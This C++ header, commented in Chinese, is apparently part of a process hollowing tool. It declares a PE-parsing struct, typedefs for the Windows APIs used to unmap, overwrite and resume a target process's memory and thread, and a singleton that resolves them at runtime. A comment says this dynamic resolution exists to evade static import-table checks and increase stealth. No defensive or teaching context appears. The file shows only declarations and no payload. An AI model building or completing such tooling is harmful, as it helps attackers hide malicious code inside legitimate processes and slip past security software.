#pragma once

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>

/**
 * @brief 日志记录宏，方便在控制台输出带格式的信息
 */
#define LOG_INFO(msg) std::cout << "[+] " << msg << std::endl
#define LOG_ERROR(msg) std::cerr << "[-] ERROR: " << msg << " (错误代码: " << GetLastError() << ")" << std::endl
#define LOG_DEBUG(msg) std::cout << "[*] " << msg << std::endl

namespace Hollowing {

    /**
     * @brief 存储 PE (Portable Executable) 文件的关键信息
     */
    struct PE_INFO {
        bool is64Bit;                       // 是否为 64 位程序
        PIMAGE_DOS_HEADER dosHeader;        // DOS 头部指针
        PIMAGE_NT_HEADERS32 ntHeaders32;    // 32 位 NT 头部指针
        PIMAGE_NT_HEADERS64 ntHeaders64;    // 64 位 NT 头部指针
        std::vector<BYTE> data;             // PE 文件的原始二进制数据
        DWORD size;                         // 文件大小
    };

    /**
     * @brief 动态 API 函数原型定义
     * 使用动态调用可以避开静态导入表检查，增强隐蔽性
     */
    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    typedef BOOL(WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef BOOL(WINAPI* pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
    typedef BOOL(WINAPI* pGetThreadContext)(HANDLE, LPCONTEXT);
    typedef BOOL(WINAPI* pSetThreadContext)(HANDLE, CONST CONTEXT*);
    typedef BOOL(WINAPI* pWow64GetThreadContext)(HANDLE, PWOW64_CONTEXT);
    typedef BOOL(WINAPI* pWow64SetThreadContext)(HANDLE, PWOW64_CONTEXT);
    typedef DWORD(WINAPI* pResumeThread)(HANDLE);
    typedef BOOL(WINAPI* pTerminateProcess)(HANDLE, UINT);

    /**
     * @brief API 解析器类 (单例模式)
     * 负责在运行时从系统 DLL 中动态获取关键函数的地址
     */
    class APIResolver {
    public:
        static APIResolver& GetInstance() {
            static APIResolver instance;
            return instance;
        }

        /**
         * @brief 解析所有需要的系统 API
         * @return 执行成功返回 true
         */
        bool ResolveAll();

        // 存储函数指针
        pNtUnmapViewOfSection NtUnmapViewOfSection;
        pCreateProcessA CreateProcessA;
        pVirtualAllocEx VirtualAllocEx;
        pWriteProcessMemory WriteProcessMemory;
        pReadProcessMemory ReadProcessMemory;
        pGetThreadContext GetThreadContext;
        pSetThreadContext SetThreadContext;
        pWow64GetThreadContext Wow64GetThreadContext;
        pWow64SetThreadContext Wow64SetThreadContext;
        pResumeThread ResumeThread;
        pTerminateProcess TerminateProcess;

    private:
        // 构造函数私有化
        APIResolver() : NtUnmapViewOfSection(nullptr), CreateProcessA(nullptr), VirtualAllocEx(nullptr),
                        WriteProcessMemory(nullptr), ReadProcessMemory(nullptr), GetThreadContext(nullptr),
                        SetThreadContext(nullptr), Wow64GetThreadContext(nullptr), Wow64SetThreadContext(nullptr),
                        ResumeThread(nullptr), TerminateProcess(nullptr) {}
    };
}
